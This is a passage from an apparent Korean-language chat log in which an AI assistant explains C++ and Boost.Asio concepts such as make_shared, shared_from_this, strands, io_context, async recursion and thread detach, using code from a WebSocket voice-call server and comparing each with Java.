  auto buf = std::make_shared<std::vector<uint8_t>>(
      std::move(std::get<std::vector<uint8_t>>(item))  // shared_ptr로 이동
  );

  복사였다면:
  writeQueue_[음성 500KB] → 복사 → item[음성 500KB]  (1MB 사용)

  이동이라면:
  writeQueue_[음성 500KB] → 이동 → item[음성 500KB]  (500KB 사용)
  writeQueue_는 비워짐

  ---
  주의점

  std::move 후 원본은 사용하면 안 됩니다:

  std::string a = "hello";
  std::string b = std::move(a);

  // a는 이제 비어있음
  std::cout << a;  // "" 또는 undefined ← 사용 금지
  std::cout << b;  // "hello" ✅

  ---
  Java와 비교

  // Java — 참조 타입은 항상 이동처럼 동작
  String a = "hello";
  String b = a;  // 같은 객체를 가리킴 (복사 없음)

  // C++ — 명시적으로 std::move 해야 이동
  std::string a = "hello";
  std::string b = std::move(a);  // 명시적 이동

  Java는 객체가 기본적으로 참조라 복사 비용이 없지만, C++은 기본이 복사라 명시적으로 std::move를 써야 복사를 피할 수 있습니다.

  ---
  한 줄 요약

  ▎ 데이터를 복사하지 않고 소유권만 이전해서 메모리 낭비를 막는 것입니다. 특히 음성처럼 큰 데이터를 다룰 때 중요합니다.

```

```
❯ `std::make_shared` 가 뭐야?

● std::make_shared

  "힙 메모리에 객체를 만들고, 자동으로 메모리를 관리해주는 스마트 포인터를 반환" 합니다.

  ---
  먼저 — 힙과 스택

  // 스택 — 함수 끝나면 자동 소멸
  void doWrite() {
      std::string msg = "hello";  // 스택에 생성
  }  // ← 함수 종료 시 msg 소멸

  // 힙 — 명시적으로 해제해야 함
  void doWrite() {
      std::string* msg = new std::string("hello");  // 힙에 생성
      // delete msg;  ← 안 하면 메모리 누수 ❌
  }

  ---
  문제 — async_write는 비동기

  void doWrite() {
      std::string msg = "hello";   // 스택에 생성

      ws_.async_write(net::buffer(msg), [](ec, size) {
          // 전송 완료 콜백
          // 이미 doWrite()는 종료됨
          // msg도 이미 소멸됨 ❌ → 전송 중 데이터 깨짐
      });
  }  // ← 여기서 msg 소멸, 전송은 아직 중

  ---
  std::make_shared가 해결

  void doWrite() {
      // 힙에 생성 + 참조 카운트 시작 (count=1)
      auto msg = std::make_shared<std::string>("hello");

      ws_.async_write(net::buffer(*msg),
          [msg](ec, size) {   // msg를 람다가 캡처 (count=2)
              // 전송 완료
          });
  }  // ← doWrite() 종료 (count=1, msg 유지)
     // 콜백 실행 완료 → count=0 → 자동 소멸 ✅

  ---
  참조 카운트 동작

  make_shared 생성          count = 1
  람다가 캡처               count = 2
  doWrite() 종료            count = 1  (msg는 살아있음)
  async_write 완료 콜백     count = 1
  콜백 종료                 count = 0  → 자동 소멸

  ---
  이 코드에서 사용

  // WsServer.cpp:182~194
  auto msg = std::make_shared<std::string>(
      std::move(std::get<std::string>(item))
  );
  ws_.async_write(net::buffer(*msg),
      net::bind_executor(strand_,
          [self = shared_from_this(), msg]  // ← msg 캡처, count+1
          (beast::error_code ec, size_t) {
              self->doWrite();  // 다음 항목 전송
          }));
  // doWrite() 끝나도 msg는 콜백이 끝날 때까지 유지

  ---
  new vs make_shared 비교

  ┌──────────────┬─────────────┬──────────────────────┐
  │              │     new     │     make_shared      │
  ├──────────────┼─────────────┼──────────────────────┤
  │ 메모리 해제  │ 수동 delete │ 자동 (참조 카운트 0) │
  ├──────────────┼─────────────┼──────────────────────┤
  │ 메모리 누수  │ 위험        │ 안전                 │
  ├──────────────┼─────────────┼──────────────────────┤
  │ 예외 발생 시 │ 누수 가능   │ 안전                 │
  ├──────────────┼─────────────┼──────────────────────┤
  │ 성능         │ 2번 할당    │ 1번 할당 (더 빠름)   │
  └──────────────┴─────────────┴──────────────────────┘

  ---
  Java와 비교

  // Java — GC가 자동 관리
  String msg = new String("hello");
  // 참조 없어지면 GC가 알아서 해제

  // C++ — GC 없음, make_shared로 수동 관리
  auto msg = std::make_shared<std::string>("hello");
  // 참조 카운트 0이 되면 즉시 해제 (GC 지연 없음)

  ---
  한 줄 요약

  ▎ 비동기 전송 중 데이터가 사라지지 않도록 힙에 생성하고 참조 카운트로 자동 관리해서, 전송 완료 후 자동으로 메모리를 해제합니다.

```

```
❯ `shared_from_this` 가 뭐야?

● shared_from_this

  "나 자신(this)을 shared_ptr로 안전하게 참조하는 방법" 입니다.

  ---
  문제 — this를 람다에 넘기면 위험

  void doRead() {
      ws_.async_read(readBuf_,
          [this](beast::error_code ec, size_t) {
              // 비동기 콜백
              this->handleTextMessage(...);  // ← this가 살아있을까?
          });
  }
  // doRead() 종료 후 WsSession이 소멸되면
  // 콜백 실행 시 this는 이미 없음 ❌ → 크래시

  ---
  shared_from_this가 해결

  // WsServer.cpp:16
  class WsSession : public std::enable_shared_from_this<WsSession> {
  //                        ↑ 이걸 상속해야 shared_from_this() 사용 가능

  void doRead() {
      ws_.async_read(readBuf_,
          [self = shared_from_this()]  // ← 참조 카운트 +1
          (beast::error_code ec, size_t) {
              self->handleTextMessage(...);  // self가 살아있음 ✅
          });
  }
  // doRead() 종료해도 self(shared_ptr)가 WsSession을 붙잡고 있음
  // 콜백 완료 후 참조 카운트 0 → 자동 소멸

  ---
  참조 카운트 흐름

  WsSession 생성 (make_shared)     count = 1
  shared_from_this() — doRead 람다  count = 2
  shared_from_this() — doWrite 람다 count = 3

  doRead 콜백 완료                  count = 2
  doWrite 콜백 완료                 count = 1
  외부에서 참조 해제                count = 0 → WsSession 소멸

  ---
  이 코드에서 사용 위치

  // 연결 수락 시
  void doAccept() {
      ws_.async_accept(net::bind_executor(strand_,
          [self = shared_from_this()](beast::error_code ec) {
              self->startStt();
              self->doRead();
          }));
  }

  // STT 결과 콜백
  stt_->recognize(callId_,
      [self = shared_from_this()](SttResult r) {
          net::post(self->strand_,
              [self, text = r.text]() {
                  self->handleFinalStt(text);  // self 안전
              });
      });

  // LLM/TTS 별도 스레드
  std::thread([self = shared_from_this(), hist]() {
      auto llmRaw = self->llm_->chat(...);  // 스레드에서도 안전
      net::post(self->strand_, [self, ...]() {
          self->sendJson(...);
      });
  }).detach();

  ---
  this vs shared_from_this 비교

  this:
      WsSession* 날 포인터
      WsSession이 소멸되면 댕글링 포인터 ❌
      비동기 콜백에서 사용 위험

  shared_from_this():
      WsSession을 가리키는 shared_ptr
      참조하는 동안 WsSession 소멸 안 됨 ✅
      비동기 콜백에서 안전

  ---
  Java와 비교

  // Java — this는 항상 안전
  // GC가 참조 있는 한 객체를 소멸시키지 않음
  ws.onMessage(msg -> {
      this.handleMessage(msg);  // 항상 안전 ✅
  });

  // C++ — this는 위험, shared_from_this 필요
  ws_.async_read([self = shared_from_this()](...) {
      self->handleMessage(...);  // shared_ptr로 안전 ✅
  });

  Java는 GC가 참조를 추적하지만, C++은 GC가 없어서 직접 참조 카운트를 유지해야 합니다.

  ---
  한 줄 요약

  ▎ 비동기 콜백이 실행될 때까지 WsSession이 소멸되지 않도록 자기 자신을 shared_ptr로 붙잡아 두는 방법입니다. Java의 GC가 하는 일을 C++에서 수동으로 하는 것입니다.

```

```
❯ `net::post` 가 뭐야?

● net::post

  "이 작업을 strand 위에서 나중에 실행해라" 고 예약하는 함수입니다.

  ---
  왜 필요한가

  LLM/TTS는 별도 스레드에서 실행됩니다:

  // WsServer.cpp:120
  std::thread([self]() {
      auto llmRaw = self->llm_->chat(...);  // 별도 스레드에서 실행
      auto audio  = self->tts_->synthesize(...);

      // 결과를 history_에 저장하고 브라우저로 전송해야 함
      // 그런데 history_, writeQueue_는 strand 위에서만 안전
      self->history_ = hist;    // ❌ 다른 스레드에서 직접 접근 위험
      self->sendJson(...);      // ❌ 다른 스레드에서 직접 호출 위험
  }).detach();

  ---
  net::post로 해결

  std::thread([self]() {
      auto llmRaw = self->llm_->chat(...);   // 별도 스레드
      auto audio  = self->tts_->synthesize(...);

      // strand로 작업 예약 — 안전하게 실행됨
      net::post(self->strand_,
          [self, llmRaw, audio]() {
              self->history_ = hist;  // ✅ strand 위에서 안전
              self->sendJson(...);    // ✅ strand 위에서 안전
              self->sendBinary(audio);
          });
  }).detach();

  ---
  실행 흐름

  [별도 스레드]                    [strand]
      │                               │
      ├── LLM 대기 (3초)              │ doRead() 처리 중
      ├── TTS 처리                    │
      │                               │
      └── net::post(strand_, 작업) ──▶│ 대기열에 추가
                                      │ doRead() 완료
                                      │ → 예약된 작업 실행
                                      │   history_ 업데이트
                                      │   sendJson()
                                      │   sendBinary()

  ---
  net::post vs net::dispatch 차이

  // net::post — 항상 나중에 실행 (현재 스택 완료 후)
  net::post(strand_, 작업);

  // net::dispatch — 이미 strand 위면 즉시 실행, 아니면 나중에
  net::dispatch(strand_, 작업);

  이 코드에서 net::post를 쓰는 이유:

  별도 스레드에서 호출
  → 항상 strand 밖에 있음
  → post/dispatch 결과 동일
  → 의도를 명확히 하기 위해 post 사용

  ---
  Java 버전과 비교

  // Java (Spring Boot)
  .publishOn(Schedulers.boundedElastic())  // 별도 스레드로 전환
  .subscribe(result -> {
      // Reactor가 스레드 안전 보장
      sendJson(...);
  });

  // C++
  std::thread([self]() {           // 별도 스레드
      auto result = llm->chat();
      net::post(self->strand_,     // strand로 돌아와서 안전하게 처리
          [self, result]() {
              self->sendJson(...);
          });
  }).detach();

  역할이 동일합니다. 오래 걸리는 작업은 별도 스레드, 결과 처리는 안전한 곳으로 돌아와서 실행합니다.

  ---
  한 줄 요약

  ▎ 별도 스레드에서 처리한 결과를 strand 위에서 안전하게 실행되도록 예약하는 함수입니다. 직접 접근하면 위험한 history_, writeQueue_를 안전하게 다루기 위해 씁니다.

```

```
❯ `net::bind_executor` 가 뭐야?

● net::bind_executor

  "이 콜백을 반드시 이 strand 위에서 실행해라" 고 묶는 함수입니다.

  ---
  net::post와 차이

  // net::post — 작업을 strand 대기열에 즉시 추가
  net::post(strand_, 작업);

  // net::bind_executor — 콜백 함수 자체에 strand를 묶어둠
  //                      나중에 콜백이 호출될 때 strand 위에서 실행
  net::bind_executor(strand_, 콜백)

  ---
  왜 필요한가

  async_read, async_accept는 내부적으로 어떤 스레드에서 콜백을 호출할지 모릅니다:

  // bind_executor 없이
  ws_.async_read(readBuf_,
      [self](ec, size) {
          self->handleMessage();  // 어느 스레드? 모름 ❌
      });

  io_context에 여러 스레드가 붙어있으면:

  스레드A ──▶ async_read 콜백 실행 중
  스레드B ──▶ 같은 콜백 또 실행   ← 동시 접근 ❌

  ---
  net::bind_executor로 해결

  // WsServer.cpp:40
  ws_.async_accept(net::bind_executor(strand_,
      [self = shared_from_this()](beast::error_code ec) {
          self->startStt();
          self->doRead();
      }));

  // WsServer.cpp:51
  ws_.async_read(readBuf_,
      net::bind_executor(strand_,
          [self = shared_from_this()](beast::error_code ec, size_t) {
              // 반드시 strand_ 위에서 실행 ✅
              self->handleMessage(...);
          }));

  ---
  net::post vs net::bind_executor 사용 시점

  net::post(strand_, 작업):
      지금 당장 strand 대기열에 추가
      → 별도 스레드에서 결과를 strand로 넘길 때

  net::bind_executor(strand_, 콜백):
      콜백 자체에 strand를 묶어둠
      나중에 호출될 때 자동으로 strand 위에서 실행
      → async_read, async_write, async_accept 등
         비동기 작업의 완료 콜백에 사용

  ---
  이 코드 전체 흐름

  [io_context 스레드풀]           [strand_]

  async_accept 완료
          │
          └── bind_executor ──────▶ doAccept 콜백 (strand 위)
                                          │
                                     startStt(), doRead()

  async_read 완료
          │
          └── bind_executor ──────▶ doRead 콜백 (strand 위)
                                          │
                                     sendChunk() or handleTextMessage()

  [별도 스레드] LLM/TTS 완료
          │
          └── net::post ──────────▶ 결과 처리 (strand 위)
                                          │
                                     sendJson(), sendBinary()

  모든 작업이 strand 위에서 실행 → history_, writeQueue_ 안전 ✅

  ---
  Java와 비교

  // Java (Spring Boot)
  // Reactor가 내부적으로 스레드 안전 보장
  // 개발자가 직접 신경 쓸 필요 없음
  .publishOn(Schedulers.boundedElastic())
  .subscribe(result -> handleFinalStt(...));

  // C++ — 개발자가 직접 strand 묶기
  ws_.async_read(readBuf_,
      net::bind_executor(strand_, 콜백));  // 명시적으로 지정

  ---
  한 줄 요약

  ▎ 비동기 작업의 완료 콜백이 반드시 strand 위에서 실행되도록 묶어두는 함수입니다. net::post가 "지금 strand에 넣어라"라면, net::bind_executor는 "나중에 호출될 때
  ▎ strand 위에서 실행해라"입니다.

```

```
❯ `net::io_context` 가 뭐야?

● net::io_context

  "비동기 작업들을 모아서 실행하는 이벤트 루프 엔진" 입니다.

  ---
  기본 개념

  // main.cpp:34
  net::io_context ioc;

  auto server = std::make_shared<WsServer>(ioc, port, ...);
  server->run();

  ioc.run();  // ← 여기서 모든 비동기 작업 처리 시작

  ioc.run()이 호출되는 순간:

  등록된 비동기 작업들을 계속 처리
          ↓
  완료된 작업의 콜백 실행
          ↓
  새 작업 등록
          ↓
  무한 반복 (더 이상 작업 없으면 종료)

  ---
  없으면 어떻게 되나

  // 동기 방식 (io_context 없이)
  ws_.accept();           // 연결 올 때까지 대기 (블로킹)
  ws_.read(readBuf_);     // 데이터 올 때까지 대기 (블로킹)
  ws_.write(response);    // 전송 완료까지 대기 (블로킹)

  // 전화 1통 처리하는 동안 다른 전화 못 받음 ❌

  // 비동기 방식 (io_context 사용)
  ws_.async_accept(...);  // 등록만 하고 바로 반환
  ws_.async_read(...);    // 등록만 하고 바로 반환
  ws_.async_write(...);   // 등록만 하고 바로 반환

  // io_context가 완료된 것들의 콜백을 순서대로 실행
  // 전화 수백 통 동시 처리 가능 ✅

  ---
  식당으로 비유

  io_context = 주방 (이벤트 루프)

  손님A 주문 (async_read)  ┐
  손님B 주문 (async_read)  ├─▶ 주방에 등록
  손님C 주문 (async_read)  ┘

  주방(io_context)이 완료된 것부터 처리:
  손님B 음식 완성 → 서빙 콜백 실행
  손님A 음식 완성 → 서빙 콜백 실행
  손님C 음식 완성 → 서빙 콜백 실행

  ---
  스레드와 함께 쓰면

  // main.cpp — 현재는 스레드 1개
  ioc.run();

  // 여러 스레드로 성능 향상 가능
  std::vector<std::thread> threads;
  for (int i = 0; i < 4; i++) {
      threads.emplace_back([&ioc]() {
          ioc.run();  // 4개 스레드가 동시에 이벤트 처리
      });
  }
  // → strand_가 동시 실행을 막아줌

  ---
  Java와 비교

  Java (Spring Boot):
      Tomcat/Netty 내부에 이벤트 루프 내장
      개발자가 직접 관리 안 해도 됨

  C++ (Boost.Asio):
      net::io_context를 직접 생성
      ioc.run()을 직접 호출
      스레드 수도 직접 관리

  ---
  이 프로젝트 전체 구조

  main()
    │
    ├── io_context ioc 생성
    │
    ├── WsServer(ioc, 9090) 생성
    │       └── acceptor_(ioc, 9090)  ← ioc에 등록
    │
    ├── server->run()
    │       └── async_accept() 등록   ← ioc에 등록
    │
    └── ioc.run()  ← 여기서 모든 것 시작
            │
            ├── 브라우저 연결 → WsSession 생성
            ├── 음성 청크 수신 → STT 전달
            ├── STT 결과 → LLM → TTS
            └── 결과 → 브라우저 전송
                (무한 반복)

  ---
  한 줄 요약

  ▎ 모든 비동기 작업(async_read, async_write, async_accept)을 등록받고 완료되면 콜백을 실행하는 중앙 이벤트 루프입니다. Java의 Tomcat/Netty 내부 엔진을 C++에서
  ▎ 직접 관리하는 것입니다.

```

```
❯ `ioc.run()` 블로킹이야 논블로킹이야?

● ioc.run()은 블로킹입니다.

  ---
  블로킹인 이유

  // main.cpp:41
  ioc.run();   // ← 여기서 멈춤
  return 0;    // ← 여기는 서버가 종료될 때까지 도달 안 함

  ioc.run()이 하는 일:

  처리할 작업 있음 → 콜백 실행
  처리할 작업 없음 → 다음 작업 올 때까지 대기
          ↓
  무한 반복
          ↓
  작업이 완전히 없어질 때만 반환

  ---
  내부에서 처리하는 것들은 논블로킹

  ioc.run() 자체는 블로킹 ← main 스레드 점유
          │
          ├── async_accept  → 논블로킹 (연결 오면 콜백)
          ├── async_read    → 논블로킹 (데이터 오면 콜백)
          └── async_write   → 논블로킹 (전송 완료 시 콜백)

  ioc.run() = 블로킹 껍데기
  내부 async_ 작업들 = 논블로킹

  ---
  비유

  ioc.run() = 콜센터 직원이 자리에 앉아 전화 대기 (블로킹)
                      │
                      ├── 전화A 옴 → 처리 → 끊음 (논블로킹)
                      ├── 전화B 옴 → 처리 → 끊음 (논블로킹)
                      └── 전화 없으면 → 대기 (블로킹)

  퇴근(return 0)은 콜센터 문 닫을 때만

  ---
  Java와 비교

  // Java Spring Boot
  SpringApplication.run(App.class, args);
  // 얘도 블로킹 — 서버 종료 전까지 반환 안 함
  // 내부적으로 Tomcat이 ioc.run()과 동일한 역할

  // C++
  ioc.run();
  // 동일한 개념, 직접 노출

  ---
  한 줄 요약

  ▎ ioc.run()은 블로킹입니다. main 스레드를 점유하며 이벤트를 기다리고, 내부에서 처리하는 async_ 작업들이 논블로킹으로 동작합니다.

```

```
❯ `async_accept` 가 뭐야?

● async_accept

  "새 연결이 오면 알려줘, 그동안 다른 일 해도 돼" 라는 비동기 연결 수락입니다.

  ---
  동기 vs 비동기 비교

  // 동기 (blocking) — accept()
  acceptor_.accept(socket);   // 연결 올 때까지 여기서 멈춤
  // 연결 오기 전까지 아무것도 못 함 ❌

  // 비동기 (non-blocking) — async_accept()
  acceptor_.async_accept(     // 등록만 하고 바로 반환
      [](ec, socket) {        // 연결 오면 나중에 이 콜백 실행
          // 연결 처리
      });
  // 등록 후 바로 다음 코드 실행 ✅

  ---
  이 코드에서 위치

  // WsServer.cpp:246
  void WsServer::doAccept() {
      acceptor_.async_accept(
          [this](beast::error_code ec, tcp::socket socket) {
              if (!ec) {
                  // 새 연결 → WsSession 생성
                  std::make_shared<WsSession>(
                      std::move(socket), ioc_, tokenMgr_, llm_, tts_
                  )->start();
              }
              doAccept();  // ← 다음 연결을 또 기다림 (재귀)
          });
  }

  ---
  재귀 호출이 핵심

  doAccept() 호출
          │
          └── async_accept 등록 후 반환

  브라우저A 연결
          │
          └── 콜백 실행
                  ├── WsSession A 생성
                  └── doAccept() 재호출  ← 다음 연결 대기

  브라우저B 연결
          │
          └── 콜백 실행
                  ├── WsSession B 생성
                  └── doAccept() 재호출  ← 또 다음 연결 대기

  재귀 호출 없으면:

  브라우저A 연결 처리 후
  다음 async_accept 등록 안 함
  → 브라우저B 연결 못 받음 ❌

  ---
  전체 흐름

  main()
    │
    └── ioc.run()
            │
            ├── async_accept 등록 (WsServer::run)
            │
            │   브라우저A 접속
            ├── 콜백: WsSession A 생성
            │         async_accept 재등록
            │         async_read 등록 (A)
            │
            │   브라우저B 접속
            ├── 콜백: WsSession B 생성
            │         async_accept 재등록
            │         async_read 등록 (B)
            │
            │   A에서 음성 청크 도착
            ├── 콜백: STT 전달
            │
            │   B에서 음성 청크 도착
            └── 콜백: STT 전달

  ---
  Java와 비교

  // Java Spring Boot
  // @ServerEndpoint("/ws/cti")
  // afterConnectionEstablished() — Spring이 내부적으로 async_accept 처리
  // 개발자가 직접 호출 안 해도 됨

  // C++
  void doAccept() {
      acceptor_.async_accept([this](...) {
          // 연결 처리
          doAccept();  // 직접 재등록
      });
  }
  // 직접 관리 필요

  ---
  한 줄 요약

  ▎ 브라우저 연결 요청을 기다리지 않고 등록만 해두고, 연결이 오면 콜백으로 WsSession을 만듭니다. 콜백 끝에 doAccept()를 재호출해서 다음 연결도 계속 받습니다.

```

```
❯ `doAccept` 와 `async_read` 차이가 뭐야?

● doAccept vs async_read 차이

  역할이 완전히 다릅니다.

  ---
  한 줄 비교

  doAccept   →  문 앞에서 새 손님(연결) 받기
  async_read →  자리 잡은 손님이 하는 말(데이터) 듣기

  ---
  시점이 다름

  브라우저 접속 시도
          │
          ▼
  doAccept (연결 수락)     ← 악수(handshake) 단계
          │
          ▼
  WsSession 생성
          │
          ▼
  async_read (데이터 수신) ← 통신 단계
          │
          ▼
  음성 청크 / JSON 이벤트 수신

  ---
  코드에서 위치

  // ① doAccept — WsServer 레벨 (서버 전체에 1개)
  // WsServer.cpp:246
  void WsServer::doAccept() {
      acceptor_.async_accept(
          [this](beast::error_code ec, tcp::socket socket) {
              // 새 연결 → WsSession 생성
              std::make_shared<WsSession>(socket, ...)->start();
              doAccept();  // 다음 연결 대기
          });
  }

  // ② async_read — WsSession 레벨 (연결 1개마다 1개)
  // WsServer.cpp:51
  void doRead() {
      ws_.async_read(readBuf_,
          [self](beast::error_code ec, size_t) {
              // 음성 청크 or JSON 이벤트 처리
              self->doRead();  // 다음 데이터 대기
          });
  }

  ---
  대상이 다름

  doAccept:
      acceptor_ (서버 소켓) 이 대상
      포트 9090을 열어두고 연결 요청 대기
      전화기 자체

  async_read:
      ws_ (WebSocket 스트림) 이 대상
      이미 연결된 클라이언트의 데이터 대기
      연결된 전화에서 상대방 목소리 듣기

  ---
  전체 그림

  [포트 9090]
      │
      │ 브라우저A 접속
      ▼
  doAccept 콜백
      │ WsSession A 생성
      │ doAccept 재등록 ──────────────┐
      │                              │ 다음 연결 대기
      ▼                              │
  async_read A 등록                  │
      │                         브라우저B 접속
      │ 음성청크 수신             doAccept 콜백
      ▼                              │
  async_read A 재등록           WsSession B 생성
      │                         async_read B 등록
      │                              │
      ▼                              ▼
  A 처리 계속                   B 처리 계속
  (독립적으로 동시 진행)

  ---
  한 줄 요약

  doAccept   →  새 브라우저 연결을 받는 것  (문 열기)
  async_read →  연결된 브라우저의 데이터를 받는 것  (대화하기)

  doAccept가 먼저 실행되고, 연결이 수립된 후에야 async_read가 시작됩니다.

```

```
❯ `doRead` 안에서 `doRead()` 재귀 호출하는 이유가 뭐야?

● doRead 안에서 doRead() 재귀 호출 이유

  "다음 데이터도 계속 받기 위해서" 입니다.

  ---
  재귀 호출 없으면

  void doRead() {
      ws_.async_read(readBuf_,
          [self](beast::error_code ec, size_t) {
              // 음성 청크 1개 처리
              self->stt_->sendChunk(chunk);
              // doRead() 없음
          });
  }

  브라우저 연결
          ↓
  async_read 등록
          ↓
  음성 청크 1개 수신 → 처리
          ↓
  끝 ❌ 더 이상 데이터 못 받음

  ---
  재귀 호출 있으면

  void doRead() {
      ws_.async_read(readBuf_,
          [self](beast::error_code ec, size_t) {
              // 음성 청크 처리
              self->stt_->sendChunk(chunk);
              self->doRead();  // ← 다음 데이터 대기 등록
          });
  }

  브라우저 연결
          ↓
  async_read 등록
          ↓
  청크1 수신 → 처리 → async_read 재등록
          ↓
  청크2 수신 → 처리 → async_read 재등록
          ↓
  청크3 수신 → 처리 → async_read 재등록
          ↓
  ...통화 종료까지 계속

  ---
  진짜 재귀가 아닌 이유

  스택 오버플로우 걱정 없습니다.

  일반 재귀:                    async 재귀:
  doRead()                      doRead()
    └── doRead()                  └── async_read 등록 후 반환
          └── doRead()                        ↓
                └── doRead()        (함수 완전히 종료)
                      └── ...                 ↓
                      스택 쌓임 ❌   콜백 실행 시 doRead() 재호출
                                    스택 안 쌓임 ✅

  async_read는 등록만 하고 즉시 반환하기 때문에 함수가 완전히 종료된 후 콜백이 실행됩니다.

  ---
  종료 조건

  무한 반복이지만 종료 시점이 있습니다:

  void doRead() {
      ws_.async_read(readBuf_,
          [self](beast::error_code ec, size_t) {
              if (ec == ws::error::closed || ec == net::error::eof) {
                  // 연결 종료 → doRead() 재호출 안 함
                  self->cancelled_ = true;
                  if (self->stt_) self->stt_->complete();
                  return;  // ← 여기서 루프 종료
              }
              // 정상 데이터 처리
              self->doRead();  // 다음 데이터 대기
          });
  }

  정상 데이터  →  처리 후 doRead() 재호출 (계속)
  연결 종료    →  return (루프 종료)

  ---
  doAccept와 동일한 패턴

  // doAccept도 같은 패턴
  void doAccept() {
      acceptor_.async_accept(
          [this](ec, socket) {
              // 연결 처리
              doAccept();  // 다음 연결 대기
          });
  }

  // doRead도 같은 패턴
  void doRead() {
      ws_.async_read(readBuf_,
          [self](ec, size) {
              // 데이터 처리
              self->doRead();  // 다음 데이터 대기
          });
  }

  ---
  한 줄 요약

  ▎ async_read는 한 번에 데이터 하나만 받기 때문에, 콜백 안에서 doRead()를 재호출해야 다음 음성 청크도 계속 받을 수 있습니다. 스택을 쌓지 않는 비동기 패턴이라
  ▎ 스택 오버플로우 걱정이 없습니다.

```

```
❯ `doAccept` 와 `doRead` 둘 다 재귀인데 서로 간섭 없어?

● 서로 간섭 없습니다.

  대상이 다르고 독립적으로 동작하기 때문입니다.

  ---
  왜 간섭이 없나

  doAccept  →  acceptor_ (서버 소켓) 감시
               WsServer 레벨 — 전체에 1개

  doRead    →  ws_ (각 세션의 WebSocket) 감시
               WsSession 레벨 — 연결마다 1개

  완전히 다른 소켓을 감시합니다.

  ---
  실제 동작

  [ioc 이벤트 루프]

  등록된 작업들:
      acceptor_ 감시 (doAccept)   ← WsServer 소유
      ws_A 감시 (doRead A)        ← WsSession A 소유
      ws_B 감시 (doRead B)        ← WsSession B 소유
      ws_C 감시 (doRead C)        ← WsSession C 소유

  각자 독립적으로 완료되면 콜백 실행
  서로 영향 없음

  ---
  간섭이 생기려면

  같은 자원을 공유해야 합니다:

  doAccept  →  acceptor_ 만 건드림
  doRead A  →  ws_A 만 건드림
  doRead B  →  ws_B 만 건드림

  공유하는 자원 없음 → 간섭 없음 ✅

  ---
  공유 자원이 있는 경우 — strand로 보호

  // tokenMgr_ 은 모든 WsSession이 공유
  std::shared_ptr<RtzrTokenManager> tokenMgr_;

  // WsSession A, B, C 모두 접근 가능
  // → RtzrTokenManager 내부에서 동기화 처리

  doAccept  ┐
  doRead A  ├──▶ tokenMgr_ (공유) ← 내부 동기화 필요
  doRead B  ┘

  ---
  타임라인으로 보면

  시간 →

  doAccept:  [대기]──[A연결]──[재등록]──[대기]──[B연결]──[재등록]──[대기]

  doRead A:             [대기]──[청크1]──[재등록]──[대기]──[청크2]──[재등록]

  doRead B:                                   [대기]──[청크1]──[재등록]──[대기]

  → 세 루프가 완전히 독립적으로 동시 진행

  ---
  한 줄 요약

  ▎ doAccept는 서버 소켓(acceptor_), doRead는 각 세션의 WebSocket(ws_)을 감시합니다. 서로 다른 소켓을 대상으로 독립적으로 동작하기 때문에 간섭이 없습니다.

```

```
❯ `detach()` 가 뭐야?

● detach()

  "이 스레드는 알아서 해라, 나는 신경 안 쓴다" 는 선언입니다.

  ---
  기본 개념

  // WsServer.cpp:120
  std::thread([self, hist]() {
      auto llmRaw = self->llm_->chat(...);
      auto audio  = self->tts_->synthesize(...);
      ...
  }).detach();  // ← 스레드를 독립적으로 실행

  ---
  detach() 없으면

  std::thread t([self, hist]() {
      // LLM/TTS 처리 (3~5초)
  });
  // t가 소멸될 때 join되지 않으면 프로그램 종료
  // std::terminate() 호출 ❌

  스레드 객체(t)가 소멸될 때 두 가지 중 하나여야 합니다:

  join()   →  스레드 완료까지 기다림
  detach() →  스레드를 독립적으로 분리
  둘 다 없음 →  std::terminate() (프로그램 강제 종료) ❌

  ---
  join vs detach 비교

  // join — 완료까지 기다림 (블로킹)
  std::thread t([]() {
      llm->chat();  // 3초
  });
  t.join();  // 3초 동안 여기서 멈춤
  // strand가 3초간 다른 작업 못 함 ❌

  // detach — 분리 후 바로 반환 (논블로킹)
  std::thread([self]() {
      llm->chat();  // 별도 스레드에서 3초
  }).detach();
  // 바로 반환, strand는 다른 작업 계속 ✅

  ---
  이 코드에서 왜 detach()인가

  // strand 위에서 실행 중
  void handleFinalStt(const std::string& text) {

      std::thread([self, hist]() {
          // LLM 3초, TTS 3초 — 오래 걸림
          auto llmRaw = self->llm_->chat(...);
          auto audio  = self->tts_->synthesize(...);

          // 완료 후 결과를 strand로 돌려보냄
          net::post(self->strand_, [self, ...]() {
              self->sendJson(...);
          });
      }).detach();  // ← 분리 후 strand는 바로 doRead() 계속
  }

  strand:
      handleFinalStt() 실행
              │
              ├── std::thread 생성 + detach()
              │           ↓ 별도 스레드에서 LLM/TTS 처리
              │
              └── 바로 반환 → doRead() 계속 처리 ✅

  별도 스레드:
      LLM 3초 대기
      TTS 3초 대기
      net::post(strand_, 결과)

  ---
  detach() 의 위험성

  스레드가 끝나기 전에 프로그램이 종료되면:

  프로그램 종료
          ↓
  detach된 스레드는 아직 실행 중
          ↓
  강제 종료 → 데이터 손실 가능 ❌

  이 코드에서 안전한 이유:

  // self = shared_from_this()
  // WsSession이 살아있는 동안만 스레드 실행
  std::thread([self = shared_from_this(), hist]() {
      //  ↑
      // shared_ptr이 WsSession 붙잡고 있음
      // 스레드 완료 전에 WsSession 소멸 안 됨 ✅

      if (self->cancelled_) return;  // 취소 확인
  }).detach();

  ---
  Java와 비교

  // Java
  CompletableFuture.runAsync(() -> {
      String result = llm.chat(...);  // 별도 스레드
      // 완료 후 콜백
  });
  // detach와 동일 — 별도 스레드에서 실행 후 잊어버림

  // C++
  std::thread([self]() {
      llm->chat();
  }).detach();

  ---
  한 줄 요약

  ▎ 스레드를 생성 후 독립적으로 분리해서 오래 걸리는 LLM/TTS 작업을 별도 스레드에서 처리하고, strand는 바로 반환해서 다른 작업을 계속 받을 수 있게 합니다.

```

```
❯ `cancelled_` 이 뭐야?

● cancelled_

  "이 통화가 이미 종료됐는지 여부를 표시하는 플래그" 입니다.

  ---
  선언

  // WsServer.cpp:222
  std::atomic<bool> cancelled_{false};

  atomic인 이유는 아래에서 설명합니다.

  ---
  왜 필요한가

  LLM/TTS는 별도 스레드에서 3~5초 걸립니다:

  브라우저 연결
          ↓
  음성 수신 → STT → LLM 처리 시작 (별도 스레드, 3초)
          ↓
          1초 후 브라우저가 갑자기 연결 끊음
          ↓
  afterConnectionClosed() 실행
          ↓
  LLM은 아직 처리 중...
          ↓
  LLM 완료 → sendJson() 호출  ← 이미 닫힌 세션에 전송 ❌

  ---
  cancelled_로 해결

  // 연결 종료 시
  void doRead() {
      ws_.async_read(readBuf_,
          [self](ec, size) {
              if (ec == ws::error::closed || ec == net::error::eof) {
                  self->cancelled_ = true;  // ← 종료 표시
                  if (self->stt_) self->stt_->complete();
                  return;
              }
              ...
          });
  }

